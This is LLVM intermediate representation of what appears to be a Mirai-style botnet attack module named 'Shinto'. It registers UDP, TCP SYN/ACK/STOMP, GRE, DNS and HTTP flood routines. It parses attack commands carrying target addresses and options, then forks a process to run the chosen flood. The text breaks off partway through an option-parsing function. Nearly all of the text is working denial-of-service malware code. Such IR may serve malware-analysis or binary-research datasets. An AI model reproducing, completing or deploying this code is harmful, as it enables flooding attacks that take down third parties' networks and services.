; ModuleID = 'host/ir_O0/Shinto.d.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [8 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [63 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 1043935, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  call void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 5, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_stomp)
  call void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  call void @add_attack(i8 zeroext 9, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* bitcast (void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http to void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*))
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %219

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, 4
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %17
  br label %219

; <label>:31:                                     ; preds = %17
  %32 = load i8*, i8** %3, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %3, align 8
  %34 = load i8, i8* %32, align 1
  store i8 %34, i8* %7, align 1
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 1
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  %39 = load i32, i32* %4, align 4
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %31
  br label %219

; <label>:42:                                     ; preds = %31
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  %45 = load i8, i8* %43, align 1
  store i8 %45, i8* %8, align 1
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = sub i64 %47, 1
  %49 = trunc i64 %48 to i32
  store i32 %49, i32* %4, align 4
  %50 = load i8, i8* %8, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %42
  br label %219

; <label>:54:                                     ; preds = %42
  %55 = load i32, i32* %4, align 4
  %56 = sext i32 %55 to i64
  %57 = load i8, i8* %8, align 1
  %58 = zext i8 %57 to i64
  %59 = mul i64 5, %58
  %60 = icmp ult i64 %56, %59
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %54
  br label %219

; <label>:62:                                     ; preds = %54
  %63 = load i8, i8* %8, align 1
  %64 = zext i8 %63 to i64
  %65 = call noalias i8* @calloc(i64 %64, i64 24) #6
  %66 = bitcast i8* %65 to %struct.attack_target*
  store %struct.attack_target* %66, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %67

; <label>:67:                                     ; preds = %114, %62
  %68 = load i32, i32* %5, align 4
  %69 = load i8, i8* %8, align 1
  %70 = zext i8 %69 to i32
  %71 = icmp slt i32 %68, %70
  br i1 %71, label %72, label %117

; <label>:72:                                     ; preds = %67
  %73 = load i8*, i8** %3, align 8
  %74 = bitcast i8* %73 to i32*
  %75 = load i32, i32* %74, align 4
  %76 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %77 = load i32, i32* %5, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %76, i64 %78
  %80 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %79, i32 0, i32 1
  store i32 %75, i32* %80, align 4
  %81 = load i8*, i8** %3, align 8
  %82 = getelementptr inbounds i8, i8* %81, i64 4
  store i8* %82, i8** %3, align 8
  %83 = load i8*, i8** %3, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %3, align 8
  %85 = load i8, i8* %83, align 1
  %86 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %87 = load i32, i32* %5, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i64 %88
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %89, i32 0, i32 2
  store i8 %85, i8* %90, align 4
  %91 = load i32, i32* %4, align 4
  %92 = sext i32 %91 to i64
  %93 = sub i64 %92, 5
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %4, align 4
  %95 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 0
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %99, i32 0, i32 0
  store i16 2, i16* %100, align 4
  %101 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 1
  %106 = load i32, i32* %105, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 0
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %111, i32 0, i32 2
  %113 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %112, i32 0, i32 0
  store i32 %106, i32* %113, align 4
  br label %114

; <label>:114:                                    ; preds = %72
  %115 = load i32, i32* %5, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %5, align 4
  br label %67

; <label>:117:                                    ; preds = %67
  %118 = load i32, i32* %4, align 4
  %119 = sext i32 %118 to i64
  %120 = icmp ult i64 %119, 1
  br i1 %120, label %121, label %122

; <label>:121:                                    ; preds = %117
  br label %219

; <label>:122:                                    ; preds = %117
  %123 = load i8*, i8** %3, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 1
  store i8* %124, i8** %3, align 8
  %125 = load i8, i8* %123, align 1
  store i8 %125, i8* %9, align 1
  %126 = load i32, i32* %4, align 4
  %127 = sext i32 %126 to i64
  %128 = sub i64 %127, 1
  %129 = trunc i64 %128 to i32
  store i32 %129, i32* %4, align 4
  %130 = load i8, i8* %9, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp sgt i32 %131, 0
  br i1 %132, label %133, label %211

; <label>:133:                                    ; preds = %122
  %134 = load i8, i8* %9, align 1
  %135 = zext i8 %134 to i64
  %136 = call noalias i8* @calloc(i64 %135, i64 16) #6
  %137 = bitcast i8* %136 to %struct.attack_option*
  store %struct.attack_option* %137, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %138

; <label>:138:                                    ; preds = %207, %133
  %139 = load i32, i32* %5, align 4
  %140 = load i8, i8* %9, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %139, %141
  br i1 %142, label %143, label %210

; <label>:143:                                    ; preds = %138
  %144 = load i32, i32* %4, align 4
  %145 = sext i32 %144 to i64
  %146 = icmp ult i64 %145, 1
  br i1 %146, label %147, label %148

; <label>:147:                                    ; preds = %143
  br label %219

; <label>:148:                                    ; preds = %143
  %149 = load i8*, i8** %3, align 8
  %150 = getelementptr inbounds i8, i8* %149, i32 1
  store i8* %150, i8** %3, align 8
  %151 = load i8, i8* %149, align 1
  %152 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %153 = load i32, i32* %5, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %155, i32 0, i32 1
  store i8 %151, i8* %156, align 8
  %157 = load i32, i32* %4, align 4
  %158 = sext i32 %157 to i64
  %159 = sub i64 %158, 1
  %160 = trunc i64 %159 to i32
  store i32 %160, i32* %4, align 4
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = icmp ult i64 %162, 1
  br i1 %163, label %164, label %165

; <label>:164:                                    ; preds = %148
  br label %219

; <label>:165:                                    ; preds = %148
  %166 = load i8*, i8** %3, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %3, align 8
  %168 = load i8, i8* %166, align 1
  store i8 %168, i8* %12, align 1
  %169 = load i32, i32* %4, align 4
  %170 = sext i32 %169 to i64
  %171 = sub i64 %170, 1
  %172 = trunc i64 %171 to i32
  store i32 %172, i32* %4, align 4
  %173 = load i32, i32* %4, align 4
  %174 = load i8, i8* %12, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp slt i32 %173, %175
  br i1 %176, label %177, label %178

; <label>:177:                                    ; preds = %165
  br label %219

; <label>:178:                                    ; preds = %165
  %179 = load i8, i8* %12, align 1
  %180 = zext i8 %179 to i32
  %181 = add nsw i32 %180, 1
  %182 = sext i32 %181 to i64
  %183 = call noalias i8* @calloc(i64 %182, i64 1) #6
  %184 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %185 = load i32, i32* %5, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %187, i32 0, i32 0
  store i8* %183, i8** %188, align 8
  %189 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %190 = load i32, i32* %5, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %192, i32 0, i32 0
  %194 = load i8*, i8** %193, align 8
  %195 = load i8*, i8** %3, align 8
  %196 = load i8, i8* %12, align 1
  %197 = zext i8 %196 to i32
  call void @util_memcpy(i8* %194, i8* %195, i32 %197)
  %198 = load i8, i8* %12, align 1
  %199 = zext i8 %198 to i32
  %200 = load i8*, i8** %3, align 8
  %201 = sext i32 %199 to i64
  %202 = getelementptr inbounds i8, i8* %200, i64 %201
  store i8* %202, i8** %3, align 8
  %203 = load i8, i8* %12, align 1
  %204 = zext i8 %203 to i32
  %205 = load i32, i32* %4, align 4
  %206 = sub nsw i32 %205, %204
  store i32 %206, i32* %4, align 4
  br label %207

; <label>:207:                                    ; preds = %178
  %208 = load i32, i32* %5, align 4
  %209 = add nsw i32 %208, 1
  store i32 %209, i32* %5, align 4
  br label %138

; <label>:210:                                    ; preds = %138
  br label %211

; <label>:211:                                    ; preds = %210, %122
  %212 = call i32* @__errno_location() #7
  store i32 0, i32* %212, align 4
  %213 = load i32, i32* %6, align 4
  %214 = load i8, i8* %7, align 1
  %215 = load i8, i8* %8, align 1
  %216 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %217 = load i8, i8* %9, align 1
  %218 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %213, i8 zeroext %214, i8 zeroext %215, %struct.attack_target* %216, i8 zeroext %217, %struct.attack_option* %218)
  br label %219

; <label>:219:                                    ; preds = %211, %177, %164, %147, %121, %61, %53, %41, %30, %16
  %220 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %221 = icmp ne %struct.attack_target* %220, null
  br i1 %221, label %222, label %225

; <label>:222:                                    ; preds = %219
  %223 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %224 = bitcast %struct.attack_target* %223 to i8*
  call void @free(i8* %224) #6
  br label %225

; <label>:225:                                    ; preds = %222, %219
  %226 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %227 = icmp ne %struct.attack_option* %226, null
  br i1 %227, label %228, label %232

; <label>:228:                                    ; preds = %225
  %229 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %230 = load i8, i8* %9, align 1
  %231 = zext i8 %230 to i32
  call void @free_opts(%struct.attack_option* %229, i32 %231)
  br label %232

; <label>:232:                                    ; preds = %228, %225
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %15 = call i32 @fork() #6
  store i32 %15, i32* %13, align 4
  %16 = load i32, i32* %13, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %21, label %18

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %13, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %18, %6
  ret void

; <label>:22:                                     ; preds = %18
  store i32 0, i32* %14, align 4
  store i32 0, i32* %14, align 4
  br label %23

; <label>:23:                                     ; preds = %54, %22
  %24 = load i32, i32* %14, align 4
  %25 = load i8, i8* @methods_len, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp slt i32 %24, %26
  br i1 %27, label %28, label %57

; <label>:28:                                     ; preds = %23
  %29 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %29, i64 %31
  %33 = load %struct.attack_method*, %struct.attack_method** %32, align 8
  %34 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %33, i32 0, i32 1
  %35 = load i8, i8* %34, align 8
  %36 = zext i8 %35 to i32
  %37 = load i8, i8* %8, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %36, %38
  br i1 %39, label %40, label %53

; <label>:40:                                     ; preds = %28
  %41 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %42 = load i32, i32* %14, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %41, i64 %43
  %45 = load %struct.attack_method*, %struct.attack_method** %44, align 8
  %46 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %45, i32 0, i32 0
  %47 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %48 = load i32, i32* %7, align 4
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %51 = load i8, i8* %11, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %47(i32 %48, i8 zeroext %49, %struct.attack_target* %50, i8 zeroext %51, %struct.attack_option* %52)
  br label %57

; <label>:53:                                     ; preds = %28
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = load i32, i32* %14, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %14, align 4
  br label %23

; <label>:57:                                     ; preds = %40, %23
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %36

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %33

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %5, align 4
  br label %10

; <label>:33:                                     ; preds = %10
  %34 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %35 = bitcast %struct.attack_option* %34 to i8*
  call void @free(i8* %35) #6
  br label %36

; <label>:36:                                     ; preds = %33, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %38

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %40

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %11

; <label>:38:                                     ; preds = %11
  %39 = load i8*, i8** %9, align 8
  store i8* %39, i8** %5, align 8
  br label %40

; <label>:40:                                     ; preds = %38, %27
  %41 = load i8*, i8** %5, align 8
  ret i8* %41
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
